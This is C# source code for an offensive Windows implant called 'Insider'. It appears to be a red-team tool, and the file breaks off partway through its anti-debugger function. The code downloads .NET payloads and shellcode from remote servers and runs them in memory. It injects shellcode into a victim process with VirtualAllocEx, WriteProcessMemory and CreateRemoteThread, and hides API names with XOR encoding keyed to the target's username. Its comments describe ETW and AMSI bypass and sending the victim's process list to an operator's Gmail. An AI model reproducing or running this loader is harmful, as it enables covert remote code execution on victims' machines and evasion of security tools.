using System;
using System.Reflection;    // For loading .NET assembly in-memory
using System.Net;           // For usage of WebClient, to receive or send data
using System.Threading;     // For threading implementation
using System.Text;          // For string implmentation
using System.Security.Cryptography;     // For cryptographic implementation
using System.Security.Principal;        // For checking (admin. priv of trgt, username of trgt)
using System.Runtime.InteropServices;   // For PInvoke
using System.IO;                        // For memorystream and file operation
using System.Diagnostics;              // For getting the process component of the currently active process

namespace Insider
{
	public class Program
	{
		// global process id variable
		public static string pid = "";

		// ========================= Thread Process(shellcode) Injection: Flags and Functions =====================

		// ==============================

		/*
		// link: https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
		// Retrieves a module handle for the specified module. The module must have been loaded by the calling process.
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetModuleHandleA(
		string module
		);
		*/
		

		// link: https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
		// Loads the specified module into the address space of the calling process.
		// The specified module may cause other modules to be loaded.
		[DllImport("kernel32.dll")]
		public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

		//getprocaddress: https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetProcAddress(
		IntPtr hModule,
		string funcName
		);

		// ================================

		// ========VIRTUALPROTECTEX=========
		/*
		//PInvoke
		[DllImport("kernel32.dll")]
		static extern bool VirtualProtectEx(
		IntPtr hProcess,
		IntPtr lpAddress,
		UIntPtr dwSize,
		uint flNewProtect,
		out uint lpflOldProtect);
		*/

		// delegate
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate bool VPEx(
		IntPtr hProcess, 
		IntPtr lpAddress,
		UIntPtr dwSize, 
		uint flNewProtect, 
		out uint lpflOldProtect
		);

		// ========VIRTUALPROTECTEX=========

		// =============OPENPROCESS============
		/*
		//link c#: https://www.pinvoke.net/default.aspx/kernel32.openprocess
		//link msdn: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
		//Getting processhandle of running remote target process
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr OpenProcess(
		uint dwDesiredAccess,   // open flag: 0x1F0FFF (hexadecimal number) meaning, full-right open process.
		bool bInheritHandle,    // false | https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
		uint dwProcessId        // From Gmail
		);
		*/

		// source: https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/
		// delegate
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate IntPtr oprocess(
		uint dwDesiredAccess, 
		bool bInheritHandle, 
		uint dwProcessId
		);

		// ================OPENPROCESS=============

		// ==============VIRTUALALLOCEX=============
		/*
		//link c#: https://www.pinvoke.net/default.aspx/kernel32.virtualallocex
		//link msdn: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
		//VirtualAllocEx lets you specify the address space in remote process
		[DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
		public static extern IntPtr VirtualAllocEx(
		IntPtr hProcess,        // target remote process handle     : OpenProcess()
		IntPtr lpAddress,       // remote process address pointer   : [in, optional] LPVOID lpAddress : As optional, So we will pass IntPtr.Zero (=null)
		uint dwSize,            // Shellcode length
		uint flAllocationType,
		uint flProtect
		);
		*/
		
		// source: https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/
		// delegate
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate IntPtr vallocx(
		IntPtr hProcess,        // target remote process handle     : OpenProcess()
		IntPtr lpAddress,       // remote process address pointer   : [in, optional] LPVOID lpAddress : As optional, So we will pass IntPtr.Zero (=null)
		uint dwSize,            // Shellcode length
		uint flAllocationType,
		uint flProtect
		);

		// ==============VIRTUALALLOCEX=============

		// ==============WRITEPROCESSMEMORY============
		/*
		//link c#: https://www.pinvoke.net/default.aspx/kernel32/WriteProcessMemory.html
		//link msdn: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
		[DllImport("kernel32.dll")]
		static extern bool WriteProcessMemory(
		IntPtr hProcess,                    // HANDLE: msdn -> IntPtr: specterops (https://miro.medium.com/max/1400/1*dbSfTScP9KjXLkwoZPsmtw.png) -> IntPtr: klezvirus (https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/)
		IntPtr lpBaseAddress,               // LPVOID: msdn -> IntPtr: specterops -> IntPtr: klezvirus
		byte[] lpBuffer,                    // But!, LPCVOID: msdn -> void: specterops -> byte[]: klezvirus
		Int32 nSize,                        // But!, SIZE_T: msdn -> nothing!: specterops -> uint: klezvirus
		out IntPtr lpNumberOfBytesWritten   // But!, [out] SIZE_T  *: msdn -> nothing!: specterops -> UIntPtr: UIntPtr
		);
		
		// Marshal.Copy() not working....: see why.... 
		*/

		// source: https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/
		// delegate
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate bool WPMemory(
		IntPtr hProcess,
		IntPtr lpBaseAddress,
		byte[] lpBuffer,
		Int32 nSize,
		out IntPtr lpNumberOfBytesWritten
		);

		// ==============WRITEPROCESSMEMORY============

		// ==============CREATEREMOTETHREAD============
		/*
		//link c#: https://www.pinvoke.net/default.aspx/kernel32.createremotethread
		//link msdn: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
		[DllImport("kernel32.dll")]
		static extern IntPtr CreateRemoteThread(
		IntPtr hProcess,                    // HANDLE: msdn -> IntPtr: specterops (https://miro.medium.com/max/1400/1*dbSfTScP9KjXLkwoZPsmtw.png) -> IntPtr: klezvirus (https://klezvirus.github.io/RedTeaming/Development/From-PInvoke-To-DInvoke/)
		IntPtr lpThreadAttributes,          // LPSECURITY_ATTRIBUTES: msdn -> nothing!: specterops -> IntPtr: klezvirus
		uint dwStackSize,                   // SIZE_T: msdn -> nothing!: specterops -> uint: klezvirus
		IntPtr lpStartAddress,              // LPTHREAD_START_ROUTINE: msdn -> nothing!: specterops -> IntPtr: klezvirus
		IntPtr lpParameter,                 // LPVOID: msdn -> IntPtr: specterops -> IntPtr: klezvirus
		uint dwCreationFlags,               // DWORD: msdn -> ulong: specterops -> uint: klezvirus
		IntPtr lpThreadId                   // LPDWORD: msdn -> nothing!: specterops -> IntPtr: klezvirus
		);
		*/

		// delegate
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate IntPtr CRThread(
		IntPtr hProcess,
		IntPtr lpThreadAttributes, 
		uint dwStackSize, 
		IntPtr lpStartAddress, 
		IntPtr lpParameter, 
		uint dwCreationFlags, 
		IntPtr lpThreadId
		);
		
		// ==============CREATEREMOTETHREAD============

		// ==============WAITFORSINGLEOBJECT===========
		/*
		// PInvoke
		[DllImport("kernel32")]
		public static extern UInt64 WaitForSingleObject(
		IntPtr hHandle,
		UInt64 dwMilliseconds
		);
		*/

		// delegate
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate UInt64 WFSO(
		IntPtr hHandle,
		UInt64 dwMilliseconds
		);

		// ==============WAITFORSINGLEOBJECT===========

		[Flags]
		public enum AllocationType
		{
			/*
			MEM_COMMIT = 0x1000,
			MEM_RESERVE = 0x00002000
			*/
			m_c = 0x1000,
			m_r = 0x00002000
		}

		[Flags]
		public enum MemoryProtection
		{
			/*
			PAGE_READWRITE = 0x04,
			PAGE_EXECUTE_READ = 0x20,
			PAGE_EXECUTE_READWRITE = 0x40
			*/
			RW = 0x04,
			RX = 0x20
		}

		// =============================================== Attached Debugger Detection: Flags and Functions ========================================

		// link: https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
		[StructLayout(LayoutKind.Sequential)]
		public struct PROCESS_BASIC_INFORMATION
		{
			public IntPtr ExitStatus;
			public IntPtr PebAddress;
			public IntPtr AffinityMask;
			public IntPtr BasePriority;
			public IntPtr UniquePID;
			public IntPtr InheritedFromUniqueProcessId;
		}

		// link: https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess#parameters
		// This above given documentation doesn't contain all enum members of PROCESSINFOCLASS.
		// visit: http://www.pinvoke.net/default.aspx/ntdll/NtQueryInformationProcess.html      => It has other ones
		[Flags]
		public enum PROCESSINFOCLASS
		{
			ProcessBasicInformation = 0x00,     // link flow chart: https://drive.google.com/file/d/1YbsUp71Dwp_CYZoU8d4QYvneU4kP_c8X/view | source: https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess#parameters
			ProcessDebugPort = 0x07,
			ProcessExceptionPort = 0x08,
			ProcessAccessToken = 0x09,
			ProcessWow64Information = 0x1A,
			ProcessImageFileName = 0x1B,
			ProcessDebugObjectHandle = 0x1E,
			ProcessDebugFlags = 0x1F,
			ProcessExecuteFlags = 0x22,
			ProcessInstrumentationCallback = 0x28,
			MaxProcessInfoClass = 0x64
		}

		/*
		[DllImport("kernel32.dll")]
		public static extern bool IsDebuggerPresent();
		*/

		/*
		// For checking presence of debugger
		// PInvoke
		[DllImport("ntdll.dll")]
		public static extern int NtQueryInformationProcess(
		IntPtr processHandle, 
		int processInformationClass, 
		IntPtr processInformation, 
		uint processInformationLength, 
		ref uint returnLength // IntPtr
		);
		*/

		// delegate
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate Int32 NtQIP(
		IntPtr processHandle, 
		int processInformationClass, 
		IntPtr processInformation, 
		uint processInformationLength, 
		ref uint returnLength // IntPtr
		);

		// Performing Function Overloading


		// For detaching debugger from current process
		// We will need debugger handle
		// PInvoke
		/*
		[DllImport("ntdll.dll")]
		public static extern int NtQueryInformationProcess(
		IntPtr processHandle, 
		int processInformationClass, 
		ref IntPtr processInformation, // Changed to: ref 
		uint processInformationLength, 
		ref uint returnLength // IntPtr
		);
		*/

		// With delegate function Overloading was not happening so I Changed function names

		// delegate
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate Int32 NtQIP2(
		IntPtr processHandle, 
		int processInformationClass, 
		ref IntPtr processInformation, // Changed to: ref 
		uint processInformationLength, 
		ref uint returnLength // IntPtr
		);

		/*
		// link: http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FDebugObject%2FNtRemoveProcessDebug.html
		// For detaching debugger from current process
		// PInvoke
		[DllImport("ntdll.dll")]
		public static extern int NtRemoveProcessDebug(
		IntPtr ProcessHandle,
		IntPtr DebugObjectHandle
		);
		*/

		// delegate
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate Int32 NtRPD(
		IntPtr ProcessHandle,
		IntPtr DebugObjectHandle
		);


		// =================================================== DECRYPTION OPERATIONS ==============================================

		// Decrypting XOR:
		public static byte[] XOR_B64_Decrypt(string cipher)
		{
			// username: {hostname}\{username}
			string username = WindowsIdentity.GetCurrent().Name;
			// xor_key: username
			string[] xor_key = username.Split('\\');
			byte[] xor_key_byte = Encoding.UTF8.GetBytes(xor_key[1]);

			//Console.WriteLine("xorkey: "+xor_key[1]);

			// b64 decrypt
			byte[] xored = Convert.FromBase64String(cipher);

			byte[] unxored = new byte[xored.Length];

			for(int i = 0; i < xored.Length; i++)
			{
				unxored[i] = (byte)(xored[i] ^ xor_key_byte[i % xor_key_byte.Length]);
			}

			return unxored;
		}
		/*
		// Decrypting AES:
		public static byte[] AES_Decrypt(byte[] cipher, byte[] saltBytes, byte[] passwordBytes)
		{
			passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

			byte[] decryptedBytes = null;

			using (MemoryStream ms = new MemoryStream())
			{
				using (RijndaelManaged AES = new RijndaelManaged())
				{
					AES.KeySize = 256;
					AES.BlockSize = 128;

					var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
					AES.Key = key.GetBytes(AES.KeySize / 8);
					AES.IV = key.GetBytes(AES.BlockSize / 8);

					AES.Mode = CipherMode.CBC;

					using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cs.Write(cipher, 0, cipher.Length);

						//PasteToConsole(saltBytes);

						cs.Close();
					}

					decryptedBytes = ms.ToArray();
				}
			}
			//PasteToConsole(decryptedBytes);        

			return decryptedBytes;
		}
		*/
		/*
		// Decryption: XOR -> AES
		// Convertion: aes_xor_byte -xor-> aes_byte -aes-> output (unencrypted) byte
		public static byte[] AES_XOR_Decrypt(byte[] cipher, byte[] saltBytes, byte[] passwordBytes)
		{
			byte[] aes_byte = XOR_Decrypt(cipher);

			//Console.WriteLine("HERE: 146");
			byte[] rawshellcode = AES_Decrypt(aes_byte, saltBytes, passwordBytes);
			//Console.WriteLine("HERE: 148");
			
			return rawshellcode;
		}
		*/
		/*
		// Encryption: AES -> B64
		// Convertion: b64_aes_byte -aes-> b64_byte -> b64_string -b64-> unencrypted byte
		public static byte[] AES_B64_Decrypt(string cipher, byte[] saltBytes, byte[] passwordBytes)
		{
			byte[] aes_byte = Convert.FromBase64String(cipher);

			byte[] rawshellcode = AES_Decrypt(aes_byte, saltBytes, passwordBytes);

			return rawshellcode;
		}
		*/

		public class Worker : MarshalByRefObject
		{
			// =================================================== LOADER OPERATIONS ==============================================

			// Actual Web Reflection:
			public byte[] WebReflect(string url, int retrycount, int timeoutTimer)
			{
				// Dealing with HTTPS requests
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				// Creating a Web Client to make web requests
				WebClient client = new WebClient();
				// Downloading byte array from the provided link via client web request.
				byte[] programBytes = null;

				int index = url.LastIndexOf("/");
				string trgtFile = url.Substring(index+1);

				while (retrycount >= 0 && programBytes == null)
				{
					try
					{
						programBytes = client.DownloadData(url);
					}
					/* Unable to download assembly from url or if url server address is down, WebException is raised
					link: https://docs.microsoft.com/en-us/dotnet/api/system.net.webexception.response?view=net-5.0
					*/
   
					catch (WebException) //ex)
					{
						Console.Write("\n[!] '{0}' not found yet: [Exception raised!]\t=>\t[!] Please add '{0}' file in the Payload Server\t=>\t", trgtFile);

						retrycount--;

						Console.Write("[*] Sleeping for {0} seconds and retrying another {1} time...", timeoutTimer, retrycount); //, ex);
						Thread.Sleep(timeoutTimer * 1000);
					}
				}
				// If for some reason, assembly doesn't exist in the url, loader gracefully exits
				if (programBytes == null)
				{
					Console.WriteLine("\n\n[-] '{0}' was not found, exiting now...", trgtFile);
					Environment.Exit(-1);
				}
				return programBytes;
			}

			public static void Start(byte[] programBytes)
			{
				// Loading the assembly from byte array that was downloaded.
				Assembly dotNetProgram = Assembly.Load(programBytes);
				// Creates a new Object Array containing a new (empty) String Array
				Object[] parameters = new String[] { null };
				// Executes the entry point of the loaded assembly
				dotNetProgram.EntryPoint.Invoke(null, parameters);
			}


			// Loader is loading (Performing in-memory execution of .NET binary):
			public static void Loader()
			{
				string url1 = "";
				string url2 = "";
				string url3 = "";

				CheckDebugger();

				// Loading Assembly no 1: ETW and AMSI patch

				//Console.WriteLine("[>] Start? ");
				//Console.ReadKey();

				Console.WriteLine("\n============LOADER==============");

				AppDomain step1 = AppDomain.CreateDomain("step1");
				Console.WriteLine("[+] Appdomain step1 created!");
				
				
				Worker remoteWorker1 = (Worker)step1.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);
				
				// cmd: ".\encrypt.exe /mscorliburl:https://github.com/[mscorlib.exe] /xor_key:[usernameoftarget] /out:xor_b64"
				string encryptedlink1 = "awdwadwadawdawdwa";	// change it

				Console.WriteLine("[+] mscorlib URL Decryption Started... ");

				url1 = Encoding.UTF8.GetString(XOR_B64_Decrypt(encryptedlink1));

				Console.WriteLine("[>] mscorlib.exe is reflectively loaded from: {0}\n", url1);

				byte[] programBytes1 = remoteWorker1.WebReflect(url1, 0, 0);
				Start(programBytes1);

				Console.WriteLine("[+] Appdomain step1 Destroyed!");
				AppDomain.Unload(step1);
				Console.WriteLine("===============================\n");
				//Console.ReadKey();

				//==========================================================================NOTE===================================================================

				// Loading Assembly no 2: Sending process ids from victim to Attacker machine via gmail, 
				// after sending, this assembly exits.
				// Then, this dropper keeps on trying to get a specific textfile from a certain url (different url).
				// Once after successfully reading and getting the pid number from remote url, 
				// Operator either have to hurry to create file and put in the `server url` in which dropper is listening or, have to give sufficent number of retry options,
				// in order to suffice their requirement.
				// The pid.txt (in remote url) will contain a pid number in it, to which process injection should happen.
				// Most probably admin process (if the current process is running in a elevated state, to get a elevated shell!)

				// With this we can make non-interractive program interractive, thereby maintaining stealth!

				//==========================================================================NOTE===================================================================

				CheckDebugger();

				Console.WriteLine("\n===============================");

				AppDomain step2 = AppDomain.CreateDomain("step2");
				Console.WriteLine("[+] Appdomain step2 created!");
				//Console.ReadKey();

				Worker remoteWorker2 = (Worker)step2.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);

				// cmd: .\encrypt.exe /remotewriteurl:https://github.com/[remotewrite.exe] /xor_key:[usernameoftarget] /out:xor_b64
				string encryptedlink2 = "awdwdawdawdawd";	// change it

				Console.WriteLine("[+] RemoteWrite URL Decryption Started... ");

				url2 = Encoding.UTF8.GetString(XOR_B64_Decrypt(encryptedlink2));

				Console.WriteLine("[>] remotewrite.exe is reflectively loaded from: {0}\n", url2);

				Console.Write("[*] Please Wait...");

				byte[] programBytes2 = remoteWorker2.WebReflect(url2, 0, 0);
				Start(programBytes2);

				Console.WriteLine("     =>      Enumerated ProcessName and corresponding PIDs are to sent to Gmail!");

				Console.WriteLine("[+] Appdomain step2 Destroyed!");
				AppDomain.Unload(step2);
				Console.WriteLine("===============================\n");
				//Console.ReadKey();

				CheckDebugger();

				Console.WriteLine("\n===============================");

				AppDomain step3 = AppDomain.CreateDomain("step3");
				Console.WriteLine("[+] Appdomain step3 created!");

				Worker remoteWorker3 = (Worker)step3.CreateInstanceAndUnwrap(typeof(Worker).Assembly.FullName, new Worker().GetType().FullName);

				// cmd: .\encrypt.exe /remotereadurl:https://raw.githubusercontent.com/[pid.txt] /xor_key:[usernameoftarget] /out:xor_b64
				string encryptedlink3 = "awdwdawdawdgrgehte";		// change it

				Console.WriteLine("[+] RemoteRead URL Decryption Started... ");

				url3 = Encoding.UTF8.GetString(XOR_B64_Decrypt(encryptedlink3));

				Console.WriteLine("[+] RemoteRead URL: {0}", url3);

				Console.WriteLine("[*] Trying to read specfied url: '{0}' until I get a PID to perform code injection!", url3);

				// Creating Another client for reading data from remote, i.e. to get pid number to perform process injection
				// Trying to fetch data from url, this process will continue till the Operators' mentioned retrycount and fetched data from remote is/becomes zero/null respectively.
				byte[] programBytes3 = remoteWorker3.WebReflect(url3, 10, 20);      // Change 

				Program.pid = Encoding.UTF8.GetString(programBytes3);

				Console.WriteLine("\n\n[>] PID present on pid.txt on remote payload server : {0}", Program.pid);

				Console.WriteLine("[+] Appdomain step3 Destroyed!");
				AppDomain.Unload(step3);
				Console.WriteLine("===============================\n");

				Console.WriteLine("[>] Press any key");
				Console.ReadKey();
			}

		   // ===================================== DROPPER OPERATIONS ====================================

			public static void Dropper()
			{
				string url4 = "";

				CheckDebugger();

				// mssgbox_x64
				// mssgbox_x64: Encrypted
				// cmd: ".\encrypt.exe /shellcodeurl:https://raw.githubusercontent.com/[encryptedshellcode.txt] /xor_key:[useranameoftarget] /out:xor_b64"
				string encryptedurl4 = "awdwdawdawdawd";	//change it

				Console.WriteLine("\n================DROPPER==================");
				Console.WriteLine("\n[+] Shellcode URL Decryption Started... ");

				url4 = Encoding.UTF8.GetString(XOR_B64_Decrypt(encryptedurl4));

				Console.WriteLine("[+] URL: {0}", url4);

				// Dealing with HTTPS requests
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

				WebClient client = new WebClient();
				client.Headers["User-Agent"] ="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";

				byte[] shellcode_download = client.DownloadData(url4);

				// Encoding.UTF8.GetString : Encoding.ASCII.GetString
				string encryptedshellcode = Encoding.UTF8.GetString(shellcode_download);

				Console.WriteLine(encryptedshellcode);

				Console.WriteLine("[+] Shellcode Decryption Started... ");

				// mssgbox_x64: XOR-b64 decrypted
				byte[] shellcode = XOR_B64_Decrypt(encryptedshellcode);

				// Gettings remote process handle
				// PInvoke
				//IntPtr rphandle = OpenProcess(0x1F0FFF, false, Convert.ToUInt32(Program.pid));

				// delegates
				//IntPtr funcaddr1 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "OpenProcess");

				string k = "OQAECwsLAwI="; // Xor-Base64(Kernel32)
				string OP = "PRUTCz4VX1NSARY="; // Xor-Base64(OpenProcess)

				//Checking whether the encrypted text matches with it's own encrypted text, provided, the xorkey will be username of the target system (gained during recon phase)
				IntPtr funcaddr1 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(XOR_B64_Decrypt(k))), Encoding.UTF8.GetString(XOR_B64_Decrypt(OP)));
				oprocess op = (oprocess)Marshal.GetDelegateForFunctionPointer(funcaddr1, typeof(oprocess));
				IntPtr rphandle = op(0x1F0FFF, false, Convert.ToUInt32(Program.pid));

				Console.WriteLine("\n[+] Victim PID: {0}", Program.pid);

				// Allocating a buffer in remote process for payload
				// PInvoke
				//IntPtr createdBuffer = VirtualAllocEx(rphandle, IntPtr.Zero, (uint)shellcode.Length, (uint)AllocationType.MEM_COMMIT | (uint)AllocationType.MEM_RESERVE, (uint)MemoryProtection.PAGE_EXECUTE_READWRITE);

				// delegates
				//IntPtr funcaddr2 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualAllocEx");

				string va = "JAwEERsGXHFbHgoVIBY="; // Xor-Base64(VirtualAllocEx)

				IntPtr funcaddr2 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(XOR_B64_Decrypt(k))), Encoding.UTF8.GetString(XOR_B64_Decrypt(va)));
				vallocx vax = (vallocx)Marshal.GetDelegateForFunctionPointer(funcaddr2, typeof(vallocx));
				IntPtr createdBuffer = vax(rphandle, IntPtr.Zero, (UInt32)shellcode.Length, (UInt32)AllocationType.m_c | (UInt32)AllocationType.m_r, (UInt32)MemoryProtection.RW);
				
				//Console.WriteLine("[?] PE mapped at     : " + String.Format("{0:X}", (ManMap.ModuleBase).ToInt64()));

				//UInt64 ptr = &createdBuffer;
				//Console.WriteLine("\n[+] Allocated memory address: ", createdBuffer);
				//Console.WriteLine("\n[+] Injected Shellcode address (the value at the memory address): ", (*ptr));
				Console.WriteLine("[+] Allocated memory for the shellcode");
				//Console.ReadKey();

				// Copy shellcode to allocated buffer
				//Marshal.Copy(shellcode, 0, (IntPtr)(createdBuffer), shellcode.Length);
				IntPtr bytesWritten;
				//WriteProcessMemory(rphandle, createdBuffer, shellcode, shellcode.Length, out bytesWritten);

				// delegate
				//IntPtr funcaddr3 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "WriteProcessMemory");

				string wp = "JRcfEQs3Ql9UFxYFKAsKX0JO"; // Xor-Base64(WriteProcessMemory)

				IntPtr funcaddr3 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(XOR_B64_Decrypt(k))), Encoding.UTF8.GetString(XOR_B64_Decrypt(wp)));
				WPMemory wpmemory = (WPMemory)Marshal.GetDelegateForFunctionPointer(funcaddr3, typeof(WPMemory));
				wpmemory(rphandle, createdBuffer, shellcode, Convert.ToInt32(shellcode.Length), out bytesWritten);

				Console.WriteLine("[+] Wrote Shellcode to the memory address");
				//Console.ReadKey();

				IntPtr hThread = IntPtr.Zero;

				//PInvoke
				//bool check = VirtualProtectEx(rphandle, createdBuffer, (UIntPtr) shellcode.Length, 0x40,  /* PAGE_EXECUTE_READ_WRITE */ out uint _);

				// delegate
				//IntPtr funcaddr4 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "VirtualProtectEx");

				uint oldProtect = 0;

				string vp = "JAwEERsGXGBFHRETBhoiSA=="; // Xor-Base64(VirtualProtectEx)

				IntPtr funcaddr4 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(XOR_B64_Decrypt(k))), Encoding.UTF8.GetString(XOR_B64_Decrypt(vp)));
				VPEx vpex = (VPEx)Marshal.GetDelegateForFunctionPointer(funcaddr4, typeof(VPEx));
				// Acc. to https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention#programming-considerations,
				// Applying page execute read to memory and also see the paragraph where DEP is present, https://dosxuz.gitlab.io/post/earlybird_dinvoke/ (find: DEP).
				bool check = vpex(rphandle, createdBuffer, (UIntPtr) shellcode.Length, (UInt32)MemoryProtection.RX, out oldProtect);

				if(check == true)
				{
					Console.WriteLine("[+] Permission of the memory region is RX");
					//Console.ReadKey();
				}
				else
				{
					Console.WriteLine("[-] Oops! Permission of the memory region isn't RX");
					System.Environment.Exit(1);
				}

				// If all good, launch the payload
				//hThread = CreateRemoteThread(rphandle, IntPtr.Zero, 0, createdBuffer, IntPtr.Zero, 0, IntPtr.Zero);

				// delegate
				//IntPtr funcaddr5 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "CreateRemoteThread");

				string crt = "MRcTBBoCYlVaHRETMQYVVVFT"; // Xor-Base64(CreateRemoteThread)

				IntPtr funcaddr5 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(XOR_B64_Decrypt(k))), Encoding.UTF8.GetString(XOR_B64_Decrypt(crt)));
				CRThread crthread = (CRThread)Marshal.GetDelegateForFunctionPointer(funcaddr5, typeof(CRThread));
				hThread = crthread(rphandle, IntPtr.Zero, 0, createdBuffer, IntPtr.Zero, 0, IntPtr.Zero);
				
				Console.WriteLine("[+] CreateRemoteThread() is called");
				//Console.ReadKey();

				if(hThread != IntPtr.Zero)
				{
					// Waiting infinite amount of time for thread to exit
					//PInvoke
					//WaitForSingleObject(hThread, 0xFFFFFFFF);

					// delegate
					//IntPtr funcaddr6 = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "WaitForSingleObject");

					string wf = "JQQfESgIQmNeHAIaACEFWlVUBg=="; // Xor-Base64(WaitForSingleObject)

					IntPtr funcaddr6 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(XOR_B64_Decrypt(k))), Encoding.UTF8.GetString(XOR_B64_Decrypt(wf)));
					WFSO wfso = (WFSO)Marshal.GetDelegateForFunctionPointer(funcaddr6, typeof(WFSO));

					wfso(hThread, 0xFFFFFFFF);

					// Open New thread to continue with the prompt
					Console.WriteLine("[+] Thread started successfully!");
				}
				else
				{
					Console.WriteLine("[!] Unable to inject shellcode!!! ;(");
				}
			}

			// Main Menu:
			public static string Banner()
			{
				CheckDebugger();

				Console.WriteLine("\n");
				Console.Write(@"[*] Choose serial number [1-4]: 
1. Loader: Bypass ETW and AMSI => Fetches .NET payloads from github/remote payload server.
				 Send Process Ids to Operator's gmail, From where Operator can pick a pid and add that to github
				 Implant will read from github to perform Process Injection 
2. Dropper: Use embeded shellcode url
3. To exit
[>] ");
				string serialnum = Console.ReadLine();

				return serialnum;
			}

			public static void MainOperation()
			{
				CheckDebugger();

				string serialnum = Banner();

				if (serialnum.Equals("3"))
				{
					System.Environment.Exit(1);
				}
				else if (serialnum.Equals("1"))
				{
					Loader();
				}
				else if(serialnum.Equals("2"))
				{
					Dropper();
				}
				else
				{
					Console.WriteLine("[-] Wrong option!");
					System.Environment.Exit(1);
				}
			}

			public static bool IsAdministrator()
			{
				using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
				{
					WindowsPrincipal principal = new WindowsPrincipal(identity);
					return principal.IsInRole(WindowsBuiltInRole.Administrator);
				}
			}

			public static void CheckDebugger()
			{
				/*
				if (IsDebuggerPresent())
				{
					Console.WriteLine("\n[!] Status: Implant is attached to a Debugger: {0}\n", IsDebuggerPresent());
					System.Environment.Exit(1);
				}
				*/

				// ProcessBasicInformation: In processInformationClass, https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess

				IntPtr phandle = Process.GetCurrentProcess().Handle;

				// http://www.pinvoke.net/default.aspx/ntdll/NtQueryInformationProcess.html
				// https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
				// https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb


				// https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.sizeof?view=net-6.0
				// Returns the unmanaged size of an object in bytes
				uint processInformationLength = (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION));


				// https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.allochglobal?view=net-6.0#system-runtime-interopservices-marshal-allochglobal(system-int32)
				// public static IntPtr AllocHGlobal (int cb);
				// Input parameter, cb = The required number of bytes in memory

				//      cb != processInformationLength
				// or,  cb != (uint)Marshal.SizeOf(typeof(ProcessBasicInformation))
				// cb == Marshal.SizeOf(typeof(ProcessBasicInformation));

				// as the number required by cb should be in bytes.

				IntPtr processInformation = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)));

				uint returnLength = 0;

				/*
				// PInvoke
				NtQueryInformationProcess(
				phandle,
				0,
				processInformation,         // -> [out]     =>  returns processInformation
				processInformationLength,
				ref returnLength
				);
				*/

				// delegate
				//IntPtr funcaddr7 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

				string nt = "HBESCQI="; // Xor-Base64(ntdll)
				string ntq = "PBEnEAsVSXlZFAoECA8TWV9ZIhcZBgsUQw=="; // Xor-Base64(NtQueryInformationProcess)

